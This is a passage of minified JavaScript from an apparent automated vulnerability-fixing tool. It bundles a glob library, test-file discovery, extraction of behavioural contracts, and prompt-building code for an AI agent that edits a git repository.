this.matchCheckTest(W,J)}matchCheckTest(X,J){return X&&(this.maxDepth===1/0||X.depth()<=this.maxDepth)&&(!J||X.canReaddir())&&(!this.opts.nodir||!X.isDirectory())&&(!this.opts.nodir||!this.opts.follow||!X.isSymbolicLink()||!X.realpathCached()?.isDirectory())&&!this.#Y(X)?X:void 0}matchCheckSync(X,J){if(J&&this.opts.nodir)return;let Q;if(this.opts.realpath){if(Q=X.realpathCached()||X.realpathSync(),!Q)return;X=Q}let W=X.isUnknown()||this.opts.stat?X.lstatSync():X;if(this.opts.follow&&this.opts.nodir&&W?.isSymbolicLink()){let G=W.realpathSync();if(G&&(G?.isUnknown()||this.opts.stat))G.lstatSync()}return this.matchCheckTest(W,J)}matchFinish(X,J){if(this.#Y(X))return;if(!this.includeChildMatches&&this.#J?.add){let W=`${X.relativePosix()}/**`;this.#J.add(W)}let Q=this.opts.absolute===void 0?J:this.opts.absolute;this.seen.add(X);let Y=this.opts.mark&&X.isDirectory()?this.#G:"";if(this.opts.withFileTypes)this.matchEmit(X);else if(Q){let W=this.opts.posix?X.fullpathPosix():X.fullpath();this.matchEmit(W+Y)}else{let W=this.opts.posix?X.relativePosix():X.relative(),G=this.opts.dotRelative&&!W.startsWith(".."+this.#G)?"."+this.#G:"";this.matchEmit(!W?"."+Y:G+W+Y)}}async match(X,J,Q){let Y=await this.matchCheck(X,Q);if(Y)this.matchFinish(Y,J)}matchSync(X,J,Q){let Y=this.matchCheckSync(X,Q);if(Y)this.matchFinish(Y,J)}walkCB(X,J,Q){if(this.signal?.aborted)Q();this.walkCB2(X,J,new n7(this.opts),Q)}walkCB2(X,J,Q,Y){if(this.#H(X))return Y();if(this.signal?.aborted)Y();if(this.paused){this.onResume(()=>this.walkCB2(X,J,Q,Y));return}Q.processPatterns(X,J);let W=1,G=()=>{if(--W===0)Y()};for(let[H,z,$]of Q.matches.entries()){if(this.#Y(H))continue;W++,this.match(H,z,$).then(()=>G())}for(let H of Q.subwalkTargets()){if(this.maxDepth!==1/0&&H.depth()>=this.maxDepth)continue;W++;let z=H.readdirCached();if(H.calledReaddir())this.walkCB3(H,z,Q,G);else H.readdirCB(($,V)=>this.walkCB3(H,V,Q,G),!0)}G()}walkCB3(X,J,Q,Y){Q=Q.filterEntries(X,J);let W=1,G=()=>{if(--W===0)Y()};for(let[H,z,$]of Q.matches.entries()){if(this.#Y(H))continue;W++,this.match(H,z,$).then(()=>G())}for(let[H,z]of Q.subwalks.entries())W++,this.walkCB2(H,z,Q.child(),G);G()}walkCBSync(X,J,Q){if(this.signal?.aborted)Q();this.walkCB2Sync(X,J,new n7(this.opts),Q)}walkCB2Sync(X,J,Q,Y){if(this.#H(X))return Y();if(this.signal?.aborted)Y();if(this.paused){this.onResume(()=>this.walkCB2Sync(X,J,Q,Y));return}Q.processPatterns(X,J);let W=1,G=()=>{if(--W===0)Y()};for(let[H,z,$]of Q.matches.entries()){if(this.#Y(H))continue;this.matchSync(H,z,$)}for(let H of Q.subwalkTargets()){if(this.maxDepth!==1/0&&H.depth()>=this.maxDepth)continue;W++;let z=H.readdirSync();this.walkCB3Sync(H,z,Q,G)}G()}walkCB3Sync(X,J,Q,Y){Q=Q.filterEntries(X,J);let W=1,G=()=>{if(--W===0)Y()};for(let[H,z,$]of Q.matches.entries()){if(this.#Y(H))continue;this.matchSync(H,z,$)}for(let[H,z]of Q.subwalks.entries())W++,this.walkCB2Sync(H,z,Q.child(),G);G()}}var ef1=(X,J)=>typeof X==="string"?new a7([X],J):Array.isArray(X)?new a7(X,J):X,QQ,YQ;var FA=s(()=>{s3();YG();OA();QQ=class QQ extends GG{matches=new Set;constructor(X,J,Q){super(X,J,Q)}matchEmit(X){this.matches.add(X)}async walk(){if(this.signal?.aborted)throw this.signal.reason;if(this.path.isUnknown())await this.path.lstat();return await new Promise((X,J)=>{this.walkCB(this.path,this.patterns,()=>{if(this.signal?.aborted)J(this.signal.reason);else X(this.matches)})}),this.matches}walkSync(){if(this.signal?.aborted)throw this.signal.reason;if(this.path.isUnknown())this.path.lstatSync();return this.walkCBSync(this.path,this.patterns,()=>{if(this.signal?.aborted)throw this.signal.reason}),this.matches}};YQ=class YQ extends GG{results;constructor(X,J,Q){super(X,J,Q);this.results=new eX({signal:this.signal,objectMode:!0}),this.results.on("drain",()=>this.resume()),this.results.on("resume",()=>this.resume())}matchEmit(X){if(this.results.write(X),!this.results.flowing)this.pause()}stream(){let X=this.path;if(X.isUnknown())X.lstat().then(()=>{this.walkCB(X,this.patterns,()=>this.results.end())});else this.walkCB(X,this.patterns,()=>this.results.end());return this.results}streamSync(){if(this.path.isUnknown())this.path.lstatSync();return this.walkCBSync(this.path,this.patterns,()=>this.results.end()),this.results}}});import{fileURLToPath as Xx1}from"node:url";var Jx1,v9;var HG=s(()=>{BX();BA();QG();FA();Jx1=typeof process==="object"&&process&&typeof process.platform==="string"?process.platform:"linux";v9=class v9{absolute;cwd;root;dot;dotRelative;follow;ignore;magicalBraces;mark;matchBase;maxDepth;nobrace;nocase;nodir;noext;noglobstar;pattern;platform;realpath;scurry;stat;signal;windowsPathsNoEscape;withFileTypes;includeChildMatches;opts;patterns;constructor(X,J){if(!J)throw TypeError("glob options required");if(this.withFileTypes=!!J.withFileTypes,this.signal=J.signal,this.follow=!!J.follow,this.dot=!!J.dot,this.dotRelative=!!J.dotRelative,this.nodir=!!J.nodir,this.mark=!!J.mark,!J.cwd)this.cwd="";else if(J.cwd instanceof URL||J.cwd.startsWith("file://"))J.cwd=Xx1(J.cwd);if(this.cwd=J.cwd||"",this.root=J.root,this.magicalBraces=!!J.magicalBraces,this.nobrace=!!J.nobrace,this.noext=!!J.noext,this.realpath=!!J.realpath,this.absolute=J.absolute,this.includeChildMatches=J.includeChildMatches!==!1,this.noglobstar=!!J.noglobstar,this.matchBase=!!J.matchBase,this.maxDepth=typeof J.maxDepth==="number"?J.maxDepth:1/0,this.stat=!!J.stat,this.ignore=J.ignore,this.withFileTypes&&this.absolute!==void 0)throw Error("cannot set absolute and withFileTypes:true");if(typeof X==="string")X=[X];if(this.windowsPathsNoEscape=!!J.windowsPathsNoEscape||J.allowWindowsEscape===!1,this.windowsPathsNoEscape)X=X.map((z)=>z.replace(/\\/g,"/"));if(this.matchBase){if(J.noglobstar)throw TypeError("base matching requires globstar");X=X.map((z)=>z.includes("/")?z:`./**/${z}`)}if(this.pattern=X,this.platform=J.platform||Jx1,this.opts={...J,platform:this.platform},J.scurry){if(this.scurry=J.scurry,J.nocase!==void 0&&J.nocase!==J.scurry.nocase)throw Error("nocase option contradicts provided scurry option")}else{let z=J.platform==="win32"?i7:J.platform==="darwin"?JQ:J.platform?r7:qA;this.scurry=new z(this.cwd,{nocase:J.nocase,fs:J.fs})}this.nocase=this.scurry.nocase;let Q=this.platform==="darwin"||this.platform==="win32",Y={...J,dot:this.dot,matchBase:this.matchBase,nobrace:this.nobrace,nocase:this.nocase,nocaseMagicOnly:Q,nocomment:!0,noext:this.noext,nonegate:!0,optimizationLevel:2,platform:this.platform,windowsPathsNoEscape:this.windowsPathsNoEscape,debug:!!this.opts.debug},W=this.pattern.map((z)=>new E9(z,Y)),[G,H]=W.reduce((z,$)=>{return z[0].push(...$.set),z[1].push(...$.globParts),z},[[],[]]);this.patterns=G.map((z,$)=>{let V=H[$];if(!V)throw Error("invalid pattern object");return new UJ(z,V,0,this.platform)})}async walk(){return[...await new QQ(this.patterns,this.scurry.cwd,{...this.opts,maxDepth:this.maxDepth!==1/0?this.maxDepth+this.scurry.cwd.depth():1/0,platform:this.platform,nocase:this.nocase,includeChildMatches:this.includeChildMatches}).walk()]}walkSync(){return[...new QQ(this.patterns,this.scurry.cwd,{...this.opts,maxDepth:this.maxDepth!==1/0?this.maxDepth+this.scurry.cwd.depth():1/0,platform:this.platform,nocase:this.nocase,includeChildMatches:this.includeChildMatches}).walkSync()]}stream(){return new YQ(this.patterns,this.scurry.cwd,{...this.opts,maxDepth:this.maxDepth!==1/0?this.maxDepth+this.scurry.cwd.depth():1/0,platform:this.platform,nocase:this.nocase,includeChildMatches:this.includeChildMatches}).stream()}streamSync(){return new YQ(this.patterns,this.scurry.cwd,{...this.opts,maxDepth:this.maxDepth!==1/0?this.maxDepth+this.scurry.cwd.depth():1/0,platform:this.platform,nocase:this.nocase,includeChildMatches:this.includeChildMatches}).streamSync()}iterateSync(){return this.streamSync()[Symbol.iterator]()}[Symbol.iterator](){return this.iterateSync()}iterate(){return this.stream()[Symbol.asyncIterator]()}[Symbol.asyncIterator](){return this.iterate()}}});var zG=(X,J={})=>{if(!Array.isArray(X))X=[X];for(let Q of X)if(new E9(Q,J).hasMagic())return!0;return!1};var $G=s(()=>{BX()});function WQ(X,J={}){return new v9(X,J).streamSync()}function DA(X,J={}){return new v9(X,J).stream()}function wA(X,J={}){return new v9(X,J).walkSync()}async function RA(X,J={}){return new v9(X,J).walk()}function GQ(X,J={}){return new v9(X,J).iterateSync()}function NA(X,J={}){return new v9(X,J).iterate()}var Qx1,Yx1,Wx1,Gx1,Hx1,AA;var LA=s(()=>{BX();HG();$G();BX();HG();$G();YG();Qx1=WQ,Yx1=Object.assign(DA,{sync:WQ}),Wx1=GQ,Gx1=Object.assign(NA,{sync:GQ}),Hx1=Object.assign(wA,{stream:WQ,iterate:GQ}),AA=Object.assign(RA,{glob:RA,globSync:wA,sync:Hx1,globStream:DA,stream:Yx1,globStreamSync:WQ,streamSync:Qx1,globIterate:NA,iterate:Gx1,globIterateSync:GQ,iterateSync:Wx1,Glob:v9,hasMagic:zG,escape:HJ,unescape:r9});AA.glob=AA});import{promises as zx1}from"fs";import*as m6 from"path";class VG{defaultIncludePatterns=["**/*.test.js","**/*.test.ts","**/*.spec.js","**/*.spec.ts","**/test/**/*.js","**/test/**/*.ts","**/tests/**/*.js","**/tests/**/*.ts","**/__tests__/**/*.js","**/__tests__/**/*.ts"];defaultExcludePatterns=["**/node_modules/**","**/dist/**","**/build/**","**/.git/**","**/coverage/**","**/*.broken.*","**/*.skip.*"];async discoverTests(X){let J=X.includePatterns||this.defaultIncludePatterns,Q=X.excludePatterns||this.defaultExcludePatterns,Y=[];for(let W of J){let G=new v9(W,{cwd:X.rootDir,ignore:Q,absolute:!0,maxDepth:X.maxDepth||10});for await(let H of G)try{let z=await this.analyzeTestFile(H,X.analyzeContent!==!1);if(z)Y.push(z)}catch(z){console.warn(`Failed to analyze test file ${H}:`,z)}}return Y}async analyzeTestFile(X,J){try{let Q=await zx1.readFile(X,"utf-8"),Y=this.detectTestFramework(Q),W=[],G=[];if(J)W=this.extractTestCases(Q,Y),G=this.extractRelatedFiles(Q,X);return{path:X,content:Q,testFramework:Y,testCases:W,relatedFiles:G}}catch(Q){return console.warn(`Cannot read test file ${X}:`,Q),null}}detectTestFramework(X){if(X.includes("from 'vitest'")||X.includes('from "vitest"'))return"vitest";if(X.includes("from '@jest/globals'")||X.includes("jest."))return"jest";if(X.includes("describe(")&&X.includes("it("))return"jest";if(X.includes("from 'mocha'")||X.includes("require('mocha')"))return"mocha";if(X.includes("from 'jasmine'")||X.includes("require('jasmine')"))return"jasmine";if(X.includes("from 'tap'")||X.includes("require('tap')"))return"tap";return"unknown"}extractTestCases(X,J){let Q=[],Y=this.extractTestBlocks(X);for(let W of Y){let G={name:W.name,description:W.description,functionUnderTest:this.extractFunctionUnderTest(W.content),behavioralExpectations:this.extractBehavioralExpectations(W.content),assertions:this.extractAssertions(W.content,J)};Q.push(G)}return Q}extractTestBlocks(X){let J=[],Q=[/(?:it|test)\s*\(\s*['"`]([^'"`]+)['"`]\s*,?\s*(?:async\s+)?\s*\(\s*\)\s*=>\s*\{([^}]+(?:\{[^}]*\}[^}]*)*)\}/g,/(?:it|test)\s*\(\s*['"`]([^'"`]+)['"`]\s*,?\s*(?:async\s+)?function\s*\(\s*\)\s*\{([^}]+(?:\{[^}]*\}[^}]*)*)\}/g,/describe\s*\(\s*['"`]([^'"`]+)['"`]\s*,?\s*\(\s*\)\s*=>\s*\{([^}]+(?:\{[^}]*\}[^}]*)*)\}/g];for(let Y of Q){let W;while((W=Y.exec(X))!==null)J.push({name:W[1],description:W[1],content:W[2]})}return J}extractFunctionUnderTest(X){let J=[/(?:const|let|var)\s+\w+\s*=\s*(?:await\s+)?(\w+)\s*\(/g,/expect\s*\(\s*(\w+)\s*\(/g,/(\w+)\s*\.\s*\w+\s*\(/g];for(let Q of J){let Y=Q.exec(X);if(Y&&Y[1]&&!["expect","jest","vi","sinon"].includes(Y[1]))return Y[1]}return}extractBehavioralExpectations(X){let J=[];if(X.includes("function(")||X.includes("=>"))J.push({type:"function-signature",description:"Function signature must be preserved",requirement:"Parameter names and count should remain consistent",critical:!0});if(X.includes("done()")||X.includes("callback("))J.push({type:"callback-pattern",description:"Callback behavior must be maintained",requirement:"Callback signature and timing should be preserved",critical:!0});if(X.includes("process.platform")||X.includes("win32"))J.push({type:"platform-compatibility",description:"Platform-specific behavior must work correctly",requirement:"Cross-platform compatibility should be maintained",critical:!1});if(X.includes("try {")||X.includes("catch")||X.includes("throw"))J.push({type:"error-handling",description:"Error handling behavior must be preserved",requirement:"Error types and handling patterns should remain consistent",critical:!1});return J}extractAssertions(X,J){let Q=[],Y=/expect\s*\(\s*([^)]+)\s*\)\s*\.([^(]+)\s*\(\s*([^)]*)\s*\)/g,W;while((W=Y.exec(X))!==null){let G=W[1].trim(),H=W[2].trim(),z=W[3].trim(),$="equals";if(H.includes("toBe")||H.includes("toEqual"))$="equals";else if(H.includes("toContain"))$="contains";else if(H.includes("toThrow"))$="throws";else if(H.includes("toHaveBeenCalled"))$="calls";Q.push({type:$,target:G,expected:z,description:`${G} should ${H} ${z}`})}return Q}extractRelatedFiles(X,J){let Q=[],Y=m6.dirname(J),W=[/import\s+.*\s+from\s+['"`]([^'"`]+)['"`]/g,/require\s*\(\s*['"`]([^'"`]+)['"`]\s*\)/g];for(let G of W){let H;while((H=G.exec(X))!==null){let z=H[1];if(z.startsWith(".")){let $=m6.resolve(Y,z);Q.push($)}else if(!z.includes("node_modules")&&!z.includes("@"))Q.push(z)}}return Q}async findTestsForFile(X,J){return(await this.discoverTests(J)).filter((Y)=>{let W=m6.basename(X,m6.extname(X));if(m6.basename(Y.path).includes(W))return!0;return Y.relatedFiles.some((H)=>H.includes(W)||H===X)})}extractBehavioralContracts(X){let J=[];for(let Y of X)for(let W of Y.testCases)J.push(...W.behavioralExpectations);return J.filter((Y,W,G)=>W===G.findIndex((H)=>H.type===Y.type&&H.requirement===Y.requirement))}}var IA=s(()=>{LA()});class KG{async extractFromVulnerableCode(X,J){if(X.includes("Gruntfile")||J.includes("grunt.registerTask"))return this.extractGruntTaskContract(J);return this.extractGeneralContract(J)}extractFromTests(X){let J=[];for(let Q of X)for(let Y of Q.testCases){let W=this.buildContractFromTestCase(Y,Q.content);if(W)J.push(W)}return J}extractGruntTaskContract(X){let J=X.match(/grunt\.registerTask\s*\(\s*["']([^"']+)["']\s*,\s*["']([^"']+)["']\s*,\s*function\s*\(\s*([^)]*)\s*\)/),Q={name:"unknown-task",parameters:[],returnType:"void"};if(J){let Y=J[1],W=J[3].split(",").map((G)=>G.trim()).filter((G)=>G.length>0);Q={name:Y,parameters:W.map((G)=>({name:G,type:"string | undefined",optional:!0,validation:["Can be any string","Used as parameter override"]})),returnType:"void",callbackPattern:this.extractCallbackPattern(X)}}return{functionSignature:Q,environmentHandling:this.extractEnvironmentHandling(X),platformCompatibility:this.extractPlatformCompatibility(X),errorHandling:this.extractErrorHandling(X),loggingBehavior:this.extractLoggingBehavior(X),integrationPoints:this.extractIntegrationPoints(X,"grunt-task")}}extractGeneralContract(X){return{functionSignature:this.extractFunctionSignature(X),environmentHandling:this.extractEnvironmentHandling(X),platformCompatibility:this.extractPlatformCompatibility(X),errorHandling:this.extractErrorHandling(X),loggingBehavior:this.extractLoggingBehavior(X),integrationPoints:this.extractIntegrationPoints(X,"general")}}extractFunctionSignature(X){let J=[/function\s+(\w+)\s*\(\s*([^)]*)\s*\)/,/const\s+(\w+)\s*=\s*\(\s*([^)]*)\s*\)\s*=>/,/(\w+)\s*:\s*\(\s*([^)]*)\s*\)\s*=>/];for(let Q of J){let Y=X.match(Q);if(Y){let W=Y[1],G=Y[2].split(",").map((H)=>H.trim()).filter((H)=>H.length>0);return{name:W,parameters:G.map((H)=>({name:H.split(":")[0].trim(),type:H.includes(":")?H.split(":")[1].trim():"any",optional:H.includes("?")||H.includes("=")})),returnType:this.inferReturnType(X),callbackPattern:this.extractCallbackPattern(X)}}}return{name:"unknown-function",parameters:[],returnType:"void"}}extractCallbackPattern(X){if(X.includes("this.async()")){let Q=X.match(/done\s*\(\s*([^)]*)\s*\)/g),Y=Q?Q[0].match(/done\s*\(\s*([^)]*)\s*\)/)?.[1].split(",").map((W)=>W.trim()).filter((W)=>W.length>0)||[]:[];return{name:"done",signature:"this.async()",expectedArgs:Y,behavior:Y.length===0?"Signal task completion without success/failure indication":"Signal task completion with result parameters"}}let J=X.match(/(\w+)\s*\(\s*([^)]*)\s*\).*callback/);if(J)return{name:J[1],signature:J[0],expectedArgs:J[2].split(",").map((Q)=>Q.trim()).filter((Q)=>Q.length>0),behavior:"Standard callback pattern"};return}extractEnvironmentHandling(X){let J=[],Q=[],Y="development",W="No explicit validation";if(X.includes("process.env.NODE_ENV"))J.push("process.env.NODE_ENV"),Q.push("process.env.NODE_ENV");let G=/(?:var|let|const)\s+\w+\s*=\s*([^;]+);/g,H;while((H=G.exec(X))!==null){let z=H[1];if(z.includes("||"))z.split("||").map((V)=>V.trim()).forEach((V)=>{if(V.includes("process.env")){if(!J.includes(V))J.push(V);if(!Q.includes(V))Q.push(V)}else if(V.includes("arg")||V.includes("environment")){if(!J.includes("arg parameter"))J.push("arg parameter");if(!Q.includes("arg"))Q.push("arg")}else if(V.includes('"')||V.includes("'")){if(Y=V.replace(/["']/g,""),!Q.includes(Y))Q.push(Y)}}),W="Uses first truthy value in precedence order"}return{defaultEnvironment:Y,environmentSources:J,precedenceOrder:Q,validationLogic:W}}extractPlatformCompatibility(X){let J=X.includes("process.platform")&&X.includes("win32"),Q="No platform-specific logic detected",Y="";if(J){let W=X.match(/process\.platform\s*===\s*["']win32["']\s*\?\s*([^:]+)\s*:\s*([^;]+)/);if(W){let G=W[1].trim(),H=W[2].trim();Q=`Windows uses ${G}, Unix uses ${H}`;let z=G.match(/["']([^"']*NODE_ENV[^"']*)["']/);if(z)Y=z[1]}}return{windowsSupport:J,platformSpecificLogic:Q,commandPrefixPattern:Y}}extractErrorHandling(X){let J=[],Q="No explicit error handling",Y="Unknown callback behavior";if(X.includes("try {")&&X.includes("catch"))J.push("try-catch exceptions"),Q="Uses try-catch for error handling";if(X.includes("function(err")||X.includes("(error,")){if(J.push("callback errors"),X.includes("if (err)")||X.includes("if (error)"))if(X.includes("done()"))Y="Always call done() regardless of success/failure",Q="Log errors but still call done()";else Q="Handle errors in callback"}if(X.includes("stderr"))J.push("stderr output");return{errorTypes:J,errorHandlingPattern:Q,callbackBehavior:Y}}extractLoggingBehavior(X){let J=[],Q="No explicit success logging",Y="No explicit error logging";if(X.includes("console.log"))J.push("console.log");if(X.includes("grunt.log")){if(X.includes("grunt.log.ok")){J.push("grunt.log.ok");let W=X.match(/grunt\.log\.ok\s*\(\s*([^)]+)\s*\)/);if(W)Q=`grunt.log.ok(${W[1]})`}if(X.includes("grunt.log.error")){J.push("grunt.log.error");let W=X.match(/grunt\.log\.error\s*\(\s*([^)]+)\s*\)/g);if(W)Y=W.join(" + ")}}return{successPattern:Q,errorPattern:Y,logMethods:J}}extractIntegrationPoints(X,J){let Q=[];if(J==="grunt-task"){if(Q.push({type:"grunt-task-system",description:"Must be compatible with grunt task runner",requirement:"Function signature must match grunt.registerTask pattern"}),X.includes("this.async()"))Q.push({type:"async-callback",description:"Uses grunt async pattern with this.async()",requirement:"Must call done() to signal completion"});if(X.includes("exec(")||X.includes("execFile("))Q.push({type:"process-execution",description:"Executes external processes",requirement:"Must execute external commands with proper arguments"});if(X.includes("process.platform"))Q.push({type:"cross-platform",description:"Works on Windows and Unix systems",requirement:"Must handle platform-specific command syntax"})}return Q}buildContractFromTestCase(X,J){if(!X.functionUnderTest)return null;return{functionSignature:{name:X.functionUnderTest,parameters:this.inferParametersFromTest(X,J),returnType:this.inferReturnTypeFromTest(X,J),callbackPattern:this.extractCallbackPatternFromTest(X,J)},environmentHandling:{defaultEnvironment:"development",environmentSources:[],precedenceOrder:[],validationLogic:"Inferred from test patterns"},platformCompatibility:{windowsSupport:!1,platformSpecificLogic:"Unknown from test",commandPrefixPattern:""},errorHandling:{errorTypes:[],errorHandlingPattern:"Unknown from test",callbackBehavior:"Unknown from test"},loggingBehavior:{successPattern:"Unknown from test",errorPattern:"Unknown from test",logMethods:[]},integrationPoints:[]}}generateFixConstraints(X){let J=[],Q=[],Y=[],W=[];for(let G of X){if(J.push(`Function parameter names must remain "${G.functionSignature.parameters.map((H)=>H.name).join(", ")}"`),G.functionSignature.callbackPattern)J.push(`Callback must be called as ${G.functionSignature.callbackPattern.name}(${G.functionSignature.callbackPattern.expectedArgs.join(", ")})`);if(G.environmentHandling.precedenceOrder.length>0)J.push(`Environment precedence: ${G.environmentHandling.precedenceOrder.join(" || ")}`);if(G.platformCompatibility.windowsSupport)J.push("Windows platform support with command prefix logic");if(G.errorHandling.callbackBehavior.includes("done()"))J.push("Error logging using existing patterns");if(Q.push("Replace vulnerable functions with secure alternatives"),Q.push("Prevent injection attacks through input validation"),Q.push("Validate/sanitize user input if needed"),Y.push("Replace insecure functions with secure equivalents"),Y.push("Add input sanitization within existing patterns"),Y.push("Improve error handling while preserving interface"),Y.push("Update internal implementation while preserving external behavior"),W.push("Changing function signature (parameter names/count)"),W.push("Changing callback signature or behavior"),G.platformCompatibility.windowsSupport)W.push("Removing Windows platform support");W.push("Changing environment precedence logic"),W.push("Altering integration patterns")}return{preserveRequired:[...new Set(J)],securityRequirements:[...new Set(Q)],allowedChanges:[...new Set(Y)],forbiddenChanges:[...new Set(W)]}}inferParametersFromTest(X,J){return[]}inferReturnTypeFromTest(X,J){return"void"}extractCallbackPatternFromTest(X,J){return}inferReturnType(X){if(X.includes("return "))return"unknown";return"void"}}import*as J8 from"path";import*as HQ from"fs/promises";class UG{testDiscovery;contractExtractor;constructor(){this.testDiscovery=new VG,this.contractExtractor=new KG}async enhanceContext(X,J,Q,Y={enabled:!0}){if(!Y.enabled)return null;let W=Date.now(),G=Y.discoveryTimeout||30000;try{U.info("[TestAware] Starting test discovery and contract extraction...");let H=await Promise.race([this.discoverRelatedTests(X,J,Q,Y),new Promise((B,M)=>setTimeout(()=>M(Error("Test discovery timeout")),G))]),z=await this.extractBehavioralContracts(X,J,Q,H,Y),$=this.contractExtractor.generateFixConstraints(z),V=this.determineTestFramework(H,Q),K=await this.determineTestCommand(Q,V),Z={relatedTests:H,behavioralContracts:z,constraints:$,testFramework:V,testCommand:K,preserveRequirements:$.preserveRequired,securityRequirements:$.securityRequirements},q=Date.now()-W;if(U.info(`[TestAware] Enhancement completed in ${q}ms: found ${H.length} tests, ${z.length} contracts`),Y.verbose)this.logTestAwareDetails(Z);return Z}catch(H){let z=Date.now()-W;return U.warn(`[TestAware] Enhancement failed after ${z}ms:`,H),null}}generatePromptEnhancement(X){if(!X||X.relatedTests.length===0)return"";let J=`

## \uD83E\uDDEA TEST-AWARE FIX GENERATION
`;if(J+=`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

`,J+=`**CRITICAL**: The following tests and behavioral contracts MUST be preserved during your fix.

`,X.behavioralContracts.length>0){J+=`### \uD83D\uDCCB BEHAVIORAL CONTRACTS TO PRESERVE

`;for(let Q of X.behavioralContracts){if(J+=`#### Function: ${Q.functionSignature.name}

`,J+=`**Function Signature:**
`,J+=`- Parameters: ${Q.functionSignature.parameters.map((Y)=>`${Y.name}: ${Y.type}`).join(", ")}
`,J+=`- Return type: ${Q.functionSignature.returnType}
`,Q.functionSignature.callbackPattern)J+=`- Callback: ${Q.functionSignature.callbackPattern.name}(${Q.functionSignature.callbackPattern.expectedArgs.join(", ")})
`,J+=`- Callback behavior: ${Q.functionSignature.callbackPattern.behavior}
`;if(J+=`
**Environment Handling:**
`,J+=`- Default: ${Q.environmentHandling.defaultEnvironment}
`,J+=`- Precedence: ${Q.environmentHandling.precedenceOrder.join(" || ")}
`,Q.platformCompatibility.windowsSupport)J+=`
**Platform Compatibility:**
`,J+=`- Windows support: Required
`,J+=`- Command pattern: ${Q.platformCompatibility.commandPrefixPattern}
`;J+=`
**Error Handling:**
`,J+=`- Pattern: ${Q.errorHandling.errorHandlingPattern}
`,J+=`- Callback behavior: ${Q.errorHandling.callbackBehavior}
`,J+=`
---

`}}J+=`### ✅ REQUIRED PRESERVATION CONSTRAINTS

`;for(let Q of X.preserveRequirements)J+=`- ✅ ${Q}
`;J+=`
### \uD83D\uDD12 SECURITY REQUIREMENTS

`;for(let Q of X.securityRequirements)J+=`- \uD83D\uDD12 ${Q}
`;J+=`
### ✅ ALLOWED CHANGES

`;for(let Q of X.constraints.allowedChanges)J+=`- ✅ ${Q}
`;J+=`
### ❌ FORBIDDEN CHANGES

`;for(let Q of X.constraints.forbiddenChanges)J+=`- ❌ ${Q}
`;if(X.relatedTests.length>0){J+=`
### \uD83E\uDDEA RELATED TESTS TO CONSIDER

`,J+=`Found ${X.relatedTests.length} test files that may be affected by your changes:

`;for(let Q of X.relatedTests.slice(0,5)){if(J+=`**${J8.basename(Q.path)}** (${Q.testFramework})
`,Q.testCases.length>0){J+=`- ${Q.testCases.length} test cases covering behavioral expectations
`;for(let Y of Q.testCases.slice(0,3))J+=`  - "${Y.name}"
`}J+=`
`}J+=`**Test Command**: \`${X.testCommand}\`

`}return J+=`### \uD83C\uDFAF TEST-AWARE FIX INSTRUCTIONS

`,J+=`1. **BEFORE FIXING**: Read existing tests to understand expected behavior
`,J+=`2. **DURING FIXING**: Ensure your changes preserve all behavioral contracts
`,J+=`3. **AFTER FIXING**: Run tests to verify behavioral preservation
`,J+=`4. **VALIDATION**: Confirm both security fix AND behavioral preservation

`,J+=`**REMEMBER**: Your fix must be INCREMENTAL, not a comprehensive rewrite.
`,J+=`Focus on fixing the security issue while preserving existing functionality.

`,J}async discoverRelatedTests(X,J,Q,Y){let W=Y.testDiscoveryRoot||Q,G=await this.testDiscovery.discoverTests({rootDir:W,analyzeContent:!0}),H=[];if(J.relatedFiles&&J.relatedFiles.length>0)for(let V of J.relatedFiles){let K=await this.testDiscovery.findTestsForFile(V,{rootDir:W,analyzeContent:!0});H.push(...K)}let z=this.extractKeywords(X);for(let V of G)if(this.testContainsKeywords(V,z))H.push(V);return H.filter((V,K,Z)=>K===Z.findIndex((q)=>q.path===V.path))}async extractBehavioralContracts(X,J,Q,Y,W){let G=[];if(W.vulnerableFilePath)try{let z=await HQ.readFile(J8.resolve(Q,W.vulnerableFilePath),"utf-8"),$=await this.contractExtractor.extractFromVulnerableCode(W.vulnerableFilePath,z);G.push($)}catch(z){U.warn(`[TestAware] Could not read vulnerable file ${W.vulnerableFilePath}:`,z)}if(J.relatedFiles)for(let z of J.relatedFiles)try{let $=J8.resolve(Q,z),V=await HQ.readFile($,"utf-8"),K=await this.contractExtractor.extractFromVulnerableCode(z,V);G.push(K)}catch($){U.warn(`[TestAware] Could not read related file ${z}:`,$)}let H=this.contractExtractor.extractFromTests(Y);return G.push(...H),G}determineTestFramework(X,J){let Y=X.map((G)=>G.testFramework).reduce((G,H)=>{return G[H]=(G[H]||0)+1,G},{}),W=Object.entries(Y).sort(([,G],[,H])=>H-G)[0];return W?W[0]:"unknown"}async determineTestCommand(X,J){try{let Q=J8.join(X,"package.json");if(JSON.parse(await HQ.readFile(Q,"utf-8")).scripts?.test)return"npm test";switch(J){case"jest":return"npx jest";case"vitest":return"npx vitest run";case"mocha":return"npx mocha";case"tap":return"npx tap";default:return"npm test"}}catch(Q){return"npm test"}}extractKeywords(X){let J=[],Q=X.title.toLowerCase().split(/\s+/);J.push(...Q.filter((W)=>W.length>3));let Y=X.body.toLowerCase().split(/\s+/);return J.push(...Y.filter((W)=>W.length>4)),J.push("security","vulnerability","injection","xss","sql","csrf"),[...new Set(J)]}testContainsKeywords(X,J){let Q=X.content.toLowerCase();return J.some((Y)=>Q.includes(Y))}logTestAwareDetails(X){U.info("[TestAware] Detailed context:"),U.info(`- Related tests: ${X.relatedTests.length}`),U.info(`- Behavioral contracts: ${X.behavioralContracts.length}`),U.info(`- Test framework: ${X.testFramework}`),U.info(`- Test command: ${X.testCommand}`),U.info(`- Preserve requirements: ${X.preserveRequirements.length}`),U.info(`- Security requirements: ${X.securityRequirements.length}`);for(let J of X.behavioralContracts)if(U.info(`- Contract for: ${J.functionSignature.name}`),J.functionSignature.callbackPattern)U.info(`  - Callback: ${J.functionSignature.callbackPattern.behavior}`)}}var CA=s(()=>{IA();I1()});var PA={};N0(PA,{GitBasedClaudeCodeAdapter:()=>ZJ});import{execSync as s9}from"child_process";class ZJ{cliAdapter;testAwareEnhancement;config;repoPath;claudeConfig;constructor(X,J=process.cwd(),Q){this.config=X,this.repoPath=J,this.claudeConfig=X.claudeCodeConfig||X.useStructuredPhases?{useStructuredPhases:X.useStructuredPhases}:void 0,this.cliAdapter=new k7(X,J,Q),this.testAwareEnhancement=new UG}constructPrompt(X,J,Q){if(Q)return Q;if(this.claudeConfig?.useStructuredPhases)return this.constructStructuredPhasedPrompt(X,J);return`You are an expert security engineer fixing vulnerabilities by directly editing files in a git repository. You have access to file editing tools and will make changes that will be committed to git.

## Issue Details:
- **Title**: ${X.title}
- **Description**: ${X.body}
